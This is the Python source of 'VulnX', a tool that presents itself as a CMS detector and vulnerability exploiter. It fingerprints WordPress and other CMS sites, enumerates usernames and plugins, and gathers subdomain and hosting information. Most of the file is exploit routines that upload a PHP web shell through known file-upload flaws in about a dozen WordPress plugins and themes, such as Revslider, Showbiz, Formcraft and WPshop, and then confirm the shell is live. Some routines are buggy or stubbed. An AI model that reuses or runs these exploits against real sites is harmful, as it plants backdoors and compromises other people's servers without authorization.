#!/usr/bin/env python

# Title : VulnX
# Author: BENSAAD Anouar
# Desc  : CMS-Detector and Vulnerability Scanner & exploiter
import sys
import argparse
import re
import requests
import os
import datetime
import random
import socket
import urllib3

bannerblue = '\033[34m'
bannerblue2 = '\033[1;1;94m'
yellowhead = '\033[1;1;94m'
#BannerCOLOR
red = '\033[91m'
green = '\033[1;32m'
bg = '\033[0;32;47m'
#DEFAULTCOLOR
B = '\033[1;3;94m' #blue
R = '\033[1;3;91m' # red
W = '\033[1;97m'  # white
Y = '\033[1;3;93m' # yellow
G = '\033[1;3;92m' # green
os.system('clear')
now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')
headers = {
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
            "Keep-Alive": "timeout=15",
            "verify" : False
}
################ BANNER #####################

def banner():
    print("""%s
                                                      
                    .:.        .:,                    
                   xM;           XK.                  
                  dx'            .lO.                 
                 do                ,0.                
             .c.lN'      ,  '.     .k0.:'             
              xMMk;d;''cOM0kWXl,',locMMX.             
              .NMK.   :WMMMMMMMx    dMMc              
               lMMO  lWMMMMMMMMMO. lMMO               
                cWMxxMMMMMMMMMMMMKlWMk                
                 .xWMMMMMMMMMMMMMMM0,%s                 
                   .,OMd,,,;0MMMO,.                   
             .l0O.%sVXVX%sOX.%sVXVX%s0MO%sVXVX%s.0Kd,             
            lWMMO0%sVXVX0%sOX.%sVXVX%sl%sVXVX%s.VXNMMO            
           .MMX;.N0%sVXVX0%s0X.%sVXVXVX0%s.0M:.OMMl           
          .OXc  ,MMO%sVXVX0%sVX%s .VXVX0%s0MMo  ,0X'          
          0x.  :XMMMk%sVXVX.%sXO.%sVXVX%sdMMMWo.  :X'         
         .d  'NMMMMMMk%sVXVX%s..%sVXVX0%s.XMMMMWl  ;c         
            'NNoMMMMMMx%sVXVXVXVXVX0.%sXMMk0Mc            
           .NMx OMMMMMMd%sVXVXVX%sl%sVXVX%s.NW.;MMc           
          :NMMd .NMMMMMMd%sVXVX%sdMd,,,,oc ;MMWx          
          .0MN,  'XMMMMMMo%sVX%soMMMMMMWl   0MW,          
           .0.    .xWMMMMM:lMMMMMM0,     kc           
            ,O.     .:dOKXXXNKOxc.      do            
             '0c        -VulnX-       ,Ol             
               ;.                     :.              
                                           
    %s# Coded By Anouar Ben Saad -%s @anouarbensaad
    """ % (bannerblue,bannerblue2
        ,W,bannerblue2,W,bannerblue2,W,bannerblue2,
        W,bannerblue2,W,bannerblue2,W,bannerblue2,
        W,bannerblue2,W,bannerblue2, 
        W,bannerblue2,W,bannerblue2,
        W,bannerblue2,W,bannerblue2,
        W,bannerblue2,W,bannerblue2,
        W,bannerblue2,
        W,bannerblue2,W,bannerblue2,
        W,bannerblue2,
        W,bannerblue2,
        yellowhead,Y))

def parser_error(errmsg):
    banner()
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "Error: " + errmsg + W)
    sys.exit()

def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u google.com")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Url scanned for")
    parser.add_argument('-f', '--file', help='Insert your file to scanning for',required=False)
    return parser.parse_args()

################ Check Files #####################

#def pathfile():

#    with open (file_name) as sites:

#        for url in sites:

#            detect_cms()

################ DETECT CMS #####################

def detect_cms():
    id = 0
    try:
        r=requests.get(url, headers)
        content = r.text
        joomla = re.findall("com_content | Joomla!", content)
        wordpress = re.findall("wp-content|[w,W]ord[p,P]ress", content)
        drupal = re.findall("Drupal|drupal|sites\/all|drupal.org", content)
        prestashop = re.findall("[P,p]restashop", content)
        if joomla:
            print ('%s[%i] Target -> %s %s CMS : Joomla \n\n%s' % (W,id,url,G,W))
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        elif prestashop:
            print ('%s[%i] %s %s CMS : Prestashop \n\n%s' % (W,id,url,G,W))
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        elif wordpress:
            print ('%s Target[%i] -> %s%s \n\n '% (W,id,url,W))
            print ('%s [+] CMS : Wordpress%s' % (G,W))
            webhosting_info()
            domain_info()

            print ('%s [~] CMS Gathering %s' %(Y,W))
            wp_version()
            wp_themes()
            wp_user()
            wp_plugin()
            
            print ('%s [~] Check Vulnerability %s' %(Y,W))
            #WP_PLUGIN_EXPLOITS CALLFUNCTIONS
            wp_wysija()
            wp_blaze()
            wp_catpro()
            wp_cherry()
            wp_dm()
            wp_fromcraft()
            wp_jobmanager()
            wp_showbiz()
            wp_synoptic()
            wp_shop()
            wp_injection()
            wp_powerzoomer()
            wp_revslider()
            wp_adsmanager()
            wp_inboundiomarketing()
        elif drupal:
            print ('%s Target[%i] -> %s %s\n\n '% (W,id,url,W))
            print ('%s [+] CMS : Drupal%s' % (G,W))
            drupal_version()
            domain_info()
            print ('%s [~] Check Vulnerability %s' %(Y,W))
        else:
            print ('%s[%i] %s %s CMS : Unknown \n\n%s' % (W,id,url,G,W))
            prestashop_version()
            domain_info()
            print ('%s [~] Check Vulnerability %s' %(Y,W))
    except Exception as e:
        print ('%s\n\nerror : %s%s' % (R,e,W))
        

################ WP GRAB INFO #####################
def wp_version():

    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url
    response = requests.get(ep,headers)
    #content=\"WordPress 5.1.1\"
    regexv1 = 'content=\"WordPress \d{0,9}.\d{0,9}.\d{0,9}\"'
    regexv1 = re.compile(regexv1)
    content = 'content=\"WordPress '
    endcontent = '\"$'
    matches = regexv1.findall(response.text)
    if matches and len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        sub1 = re.sub(content,'',version)
        sub2 = re.sub (endcontent,'',sub1)
        return print ('%s [*] Version : %s %s' %(B,sub2,W))

def wp_themes():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url
    response = requests.get(ep,headers)
    #content=\"WordPress 5.1.1\"
    regexv1 = 'themes/(.+?)/'
    regexv1 = re.compile(regexv1)
    matches = regexv1.findall(response.text)
    if matches and len(matches) > 0 and matches[0] != None and matches[0] != "":
        Theme = matches[0]
        return print ('%s [*] Themes : %s %s' %(B,Theme,W))


def wp_user():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url + '/?author=1'
    response = requests.get(ep,headers)
    #content=\"WordPress 5.1.1\"
    regexv1 = 'author/(.+?)/'
    regexv1 = re.compile(regexv1)
    matches = regexv1.findall(response.text)
    if matches and len(matches) > 0 and matches[0] != None and matches[0] != "":
        User = matches[0]
        return print ('%s [*] User : %s %s' %(B,User,W))
        
def wp_plugin():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    plugins_array = []
    ep = url
    id=1
    getplugin = requests.get(ep,headers)
    #content=\"WordPress 5.1.1\"
    regexv1 = r'wp-content/plugins/(.+?)/'
    regexv1 = re.compile(regexv1)
    matches = regexv1.findall(getplugin.text)
    for plug in matches:
        if plug not in plugins_array:
            plugins_array.append(plug)
    print ('%s [*] Plugins : %s %s' %(B," \n [*] Plugins : ".join(plugins_array),W))

################ Drupal Version #####################
def drupal_version():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
        }
    ep = url
    uknownversion = "UKNOWN"
    response = requests.get(ep,headers)
    regex = 'Drupal \d{0,10}'
    regex = re.compile(regex)
    matches = regex.findall(response.text)
    if len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        return print ('%s [*] Drupal Version : %s %s' %(B,version,W))
    else:
        return print ('%s [!] Drupal Version : %s %s' %(R,uknownversion,W))

################ Prestashop Version #####################
def prestashop_version():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    }
    ep = url
    uknownversion = "UKNOWN"
    response = requests.get(ep,headers,Verify=False)
    regex = 'Prestashop \d{0,9}'
    regex = re.compile(regex)
    matches = regex.findall(response.text)
    if len(matches) > 0 and matches[0] != None and matches[0] != "":
        version = matches[0]
        return print ('%s [*] Prestashop Version : %s %s' %(B,version,W))
    else:
        return print ('%s [!] Prestashop Version : %s %s' %(R,uknownversion,W))

################ SCAN DOMAIN INFO #####################

def domain_info():
    print ('%s [~] Search for SubDomains %s' %(Y,W))
    searchurl = "https://www.pagesinventory.com/search/?s=" + url
    getinfo = requests.get(searchurl,headers).text
    domains = []
    regex_domain = "<td><a href=\"\/domain\/(.*?).html\">"
    regex_ip = "<a href=\"/ip\/(.*?).html\">"
    regex_domain = re.compile(regex_domain)
    regex_ip = re.compile(regex_ip)
    matches_domain = regex_domain.findall(getinfo)
    match_ip = regex_ip.findall(getinfo)
    for domain in matches_domain:
        if domain not in domains:
            domains.append(domain)
    print ('%s [*] SubDomains : %s %s' %(B," \n [*] SubDomains : ".join(domains),W))
    if match_ip and len(match_ip) > 0 and match_ip[0] != None and match_ip[0] != "":
        IP = match_ip[0]
        print ('%s [*] IP : %s %s' %(B,IP,W))

##################### URL TO DOMAIN ##########################

def urltodomain():
    http = '^http://www.'
    https= '^https://www.'
    httpw= '^http://'
    httpsw= '^https://'
    check_httpw = re.findall(httpw,url)
    check_httpsw= re.findall(httpsw,url)
    check_http = re.findall(http,url)
    check_https= re.findall(https,url)
    if check_http:
        regex = re.compile(http)
        domain = re.sub(regex,'',url)
        return domain
    elif check_https:
        regex = re.compile(https)
        domain = re.sub(regex,'',url)
        return domain
    elif check_httpw:
        regex = re.compile(httpw)
        domain = re.sub(regex,'',url)
        return domain
    elif check_httpsw:
        regex = re.compile(httpsw)
        domain = re.sub(regex,'',url)
        return domain

################ Web Hosting Information #####################

def webhosting_info():
    print ('%s [~] Web Hosting Information %s' %(Y,W))
    urldate = "https://input.payapi.io/v1/api/fraud/domain/age/" + urltodomain()
    getinfo = requests.get(urldate,headers).text
    regex_date = r'Date: (.+?)-(.+?)'
    regex_date = re.compile(regex_date)
    matches = re.search(regex_date,getinfo)
    if matches:
        print ( '%s [*] Domain Created on : %s' % (B,matches.group(1)))
    ip = socket.gethostbyname(urltodomain())
    print ( '%s [*] CloudFlare IP : %s' % (B,ip))
    ipinfo = "http://ipinfo.io/" + ip + "/json"
    getipinfo = requests.get(ipinfo,headers).text
    country = re.search(re.compile(r'country\": \"(.+?)\"'),getipinfo)
    region = re.search(re.compile(r'region\": \"(.+?)\"'),getipinfo)
    if country:
        print('%s [*] Country : %s' % (B,country.group(1)))
    if region:
        print('%s [*] Region : %s' % (B,region.group(1)))
    
################ Blaze SlideShow #####################

def wp_blaze():
    headers['Content_Type']:'multipart/form-data'
    options = {
               'album_img':[open('./shell/VulnX.php','rb')],
               'task':'blaze_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    endpoint = url + "/wp-admin/admin.php?page=blaze_manage"
    send_shell = requests.post(endpoint,options,headers)
    content  = send_shell.text
    check_blaze = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_blaze:
        uploadfolder = check_blaze.group(1)
        dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Blaze SlideShow %s =============> %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
    else: 
        print ('%s [%s-%s] Blaze SlideShow %s =============> %s FAIL%s' %(W,R,W,W,R,W))    

################ Catpro #####################

def wp_catpro():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'album_img':[open('./shell/VulnX.php','rb')],
            'task':'cpr_add_new_album',
            'album_name':'',
            'album_desc':''
    }
    endpoint = url + "/wp-admin/admin.php?page=catpro_manage"
    send_shell = requests.post(endpoint,options,headers)
    content  = send_shell.text
    check_catpro = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_catpro:
        uploadfolder = check_catpro.group(1)
        dump_data = url + "/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Catpro Plugin%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Catpro Plugin%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    

################ CherryFramework #####################

def  wp_cherry():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'file':open('./shell/VulnX.php','rb')
    }
    endpoint = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    content  = response.text
    check_cherry = re.findall("Vuln X", content)
    if check_cherry:
        print ('%s [%s+%s] CherryFramework%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s%s ' % ( B,W,dump_data,W))
    else:
        print ('%s [%s-%s] CherryFramework%s ------------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Download Manager #####################
def wp_dm():
    headers['Content_Type']:'multipart/form-data'
    options = {
            'upfile':open('./shell/VulnX.php','rb'),
            'dm_upload':''
    }
    send_shell = requests.post(url,options,headers)
    dump_data = url + "/wp-content/plugins/downloads-manager/upload/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    content  = response.text
    check_dm = re.findall("Vuln X", content)
    if check_dm:
        print ('%s [%s+%s] Download Manager %s---- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W))
    else:
        print ('%s [%s-%s] Download Manager %s --- %s FAIL%s' %(W,R,W,W,R,W))    

################ powerzoomer #####################

def wp_powerzoomer():
    endpoint = url + "/wp-admin/admin.php?page=powerzoomer_manage"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
               'album_img':[open('./shell/VulnX.php','rb')],
               'task':'pwz_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    check_powerzoomer = re.findall("\/uploads\/powerzoomer\/(.*?)\/big\/VulnX.php", response)
    if check_powerzoomer:
        uploadfolder = check_powerzoomer.group(1)
        dump_data = url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnX.php?Vuln=X"
        print ('%s [%s+%s] Powerzoomer %s ------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W ))
    else:
        print ('%s [%s-%s] Powerzoomer %s ------- %s FAIL%s' %(W,R,W,W,R,W))

def wp_revslider():
    endpoint = url + "/wp-admin/admin-ajax.php"
    headers={
        'Cookie':'',
        'Content_Type' : 'form-data',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    }
    options = {
        'action':'revslider_ajax_action',
        'client_action':'update_plugin',
        'update_file':[open('./shell/VulnX.zip','rb')]
    }
    send_shell = requests.post(endpoint,options,headers)
    revslidera=requests.get(url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderb=requests.get(url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderc=requests.get(url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderd=requests.get(url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revslidere=requests.get(url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderf=requests.get(url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderg=requests.get(url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderh=requests.get(url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revslideri=requests.get(url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderj=requests.get(url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderk=requests.get(url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderl=requests.get(url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    revsliderm=requests.get(url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers).text
    check_revslidera = re.findall("Vuln X", revslidera)
    check_revsliderb = re.findall("Vuln X", revsliderb)
    check_revsliderc = re.findall("Vuln X", revsliderc)
    check_revsliderd = re.findall("Vuln X", revsliderd)
    check_revslidere = re.findall("Vuln X", revslidere)
    check_revsliderf = re.findall("Vuln X", revsliderf)
    check_revsliderg = re.findall("Vuln X", revsliderg)
    check_revsliderh = re.findall("Vuln X", revsliderh)
    check_revslideri = re.findall("Vuln X", revslideri)
    check_revsliderj = re.findall("Vuln X", revsliderj)
    check_revsliderk = re.findall("Vuln X", revsliderk)
    check_revsliderl = re.findall("Vuln X", revsliderl)
    check_revsliderm = re.findall("Vuln X", revsliderm)
    if check_revslidera:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderb:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderc:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderd:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revslidere:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderf:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderg:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderh:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revslideri:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderj:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderk:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderl:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    elif check_revsliderm:
        print ('%s [%s+%s] Revslider Plugin%s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X",W))
    else:
        print ('%s [%s-%s] Revslider Plugin%s ---------- %s FAIL%s' %(W,R,W,W,R,W))


################ Formcraft #####################
def wp_fromcraft():
    shell = open('./shell/VulnX.php','rb')
    fields= "files[]"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            fields:shell
    }
    endpoint = url + "/wp-content/plugins/formcraft/file-upload/server/php/"
    send_shell = requests.post(endpoint,options,headers)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
    check_fromcraft = re.findall("\"files", response)
    if check_fromcraft:
        print ('%s [%s+%s] Formcraft %s ---------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W, dump_data,W ))
    else:
        print ('%s [%s-%s] Formcraft %s ---------- %s FAIL%s' %(W,R,W,W,R,W))    

################ Job Manager #####################

def wp_jobmanager():
    endpoint = url + "/jm-ajax/upload_file/"
    image = open('./shell/VulnX.gif','rb')
    field = "file[]"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:image
    }

    send_image = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/VulnX.gif"
    response=requests.get(dump_data, headers)
    res  = response.headers['content-type']
    check_jobmanager = re.findall("image\/gif", res)
    
    if check_jobmanager:
        print ('%s [%s+%s] Job Manager%s -------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Job Manager%s -------- %s FAIL%s' %(W,R,W,W,R,W))

################ Showbiz Pro #####################

def wp_showbiz():
    endpoint = url + "/wp-admin/admin-ajax.php"
    def random_UserAgent():
        useragents_rotate = [
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"
        ]
        useragents_random = random.choice(useragents_rotate)
        return useragents_random
    useragent=random_UserAgent()
    headers['User-Agent'] = useragent
    headers['Content_Type'] = 'multipart/form-data'
    options = {
                "action":"showbiz_ajax_action",
                "client_action":"update_plugin",
                "update_file":[open('./shell/VulnX.php','rb')]
            }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/showbiz/temp/update_extract/VulnX.php?Vuln=X"
    response=requests.get(dump_data, options)
    res  = response.text
    check_showbiz = re.findall("Vuln X", res)
    if check_showbiz:
        print ('%s [%s+%s] Showbiz Pro%s ------------ %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Showbiz Pro%s ------------ %s FAIL%s' %(W,R,W,W,R,W))

################ Synoptic #####################

def wp_synoptic():
    endpoint = url + "/wp-content/themes/synoptic/lib/avatarupload/upload.php"
    shell = open('./shell/VulnX.php','rb')
    field = "qqfile"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:shell
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/markets/avatars/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_synoptic = re.findall("Vuln X", res)
    
    if check_synoptic:
        print ('%s [%s+%s] Synoptic%s ----------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Synoptic%s ----------- %s FAIL%s' %(W,R,W,W,R,W))

################ WPshop eCommerce #####################

def wp_shop():
    endpoint = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
    shell = open('./shell/VulnX.php','rb')
    field = "wpshop_file"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            field:shell
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_shop = re.findall("Vuln X", res)
    if check_shop:
        print ('%s [%s+%s] WPshop eCommerce%s ------------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] WPshop eCommerce%s ------------- %s FAIL%s' %(W,R,W,W,R,W))

################ Content Injection #####################

def wp_injection():
    endpoint = url + "index.php/wp-json/wp/v2/posts/"
    check_shop = False
    a="a"
    if check_shop:
        print ('%s [%s+%s] Injection Content%s ----------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s %s' % ( G,W,B,W,a,W))
    else:
        print ('%s [%s-%s] Injection Content%s --------- %s FAIL%s' %(W,R,W,W,R,W))


################ Simple Ads Manager #####################

def wp_adsmanager():
    endpoint = url + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"
    shell = open('./shell/VulnX.php','rb')
    field = "wpshop_file"
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            'uploadfile':shell,
            'action':'upload_ad_image',
            'path':''
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/plugins/simple-ads-manager/VulnX.php?Vuln=X/"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_adsmanager = re.findall("{\"status\":\"success\"}", res)
    if check_adsmanager:
        print ('%s [%s+%s] Simple Ads Manager%s -------- %s VULN%s' %(W,G,W,W,G,W))
        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s%s%s' % ( G,W,B,W,dump_data,W))
    else:
        print ('%s [%s-%s] Simple Ads Manager%s -------- %s FAIL%s' %(W,R,W,W,R,W))

################ Wysija Newsletters #####################

def wp_wysija():
    theme = "my-theme"
    endpoint = url + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
    shell = open('./shell/VulnX.php','rb')
    
    field = "wpshop_file"
    headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
    headers['Content_Type'] = 'form-data'
    options = {
            'theme':shell,
            'overwriteexistingtheme':'on',
            'action':'themeupload',
            'submitter':'Upload'
    }
    send_shell = requests.post(endpoint,options,headers)
    dump_data = url + "/wp-content/uploads/wysija/themes/VulnX/VulnX.php?Vuln=X"
    response=requests.get(dump_data, headers)
    res  = response.text
    check_wysija = re.findall("Vuln X", res)
    if check_wysija:
        print ('%s [%s+%s] Wysija Newsletters%s -------------- %s VULN%s' %(W,G,W,W,G,W))
